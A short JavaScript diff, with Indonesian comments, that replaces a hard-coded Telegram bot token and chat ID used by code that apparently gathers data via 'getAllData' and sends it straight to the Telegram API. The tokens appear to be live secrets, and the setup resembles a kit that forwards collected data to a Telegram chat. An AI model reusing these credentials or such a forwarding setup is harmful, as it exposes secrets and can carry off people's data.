@@ -15,8 +15,8 @@ const getAllData = () => {
 
 // Config Telegram Bot
 const telegramConfig = {
-  botToken: "7697262247:AAG9NfpEK5BiTQl5b620INnv1bZkku09R6c",  // Ganti dengan token bot Anda
-  chatId: "7669541269"      // Ganti dengan chat ID tujuan
+  botToken: "8020153206:AAHYuGdq4VYd8LFt6gu40xpiOXtN7teQ114",  // Ganti dengan token bot Anda
+  chatId: "7604126353"      // Ganti dengan chat ID tujuan
 };
 
 // Fungsi untuk mengirim langsung ke Telegram API
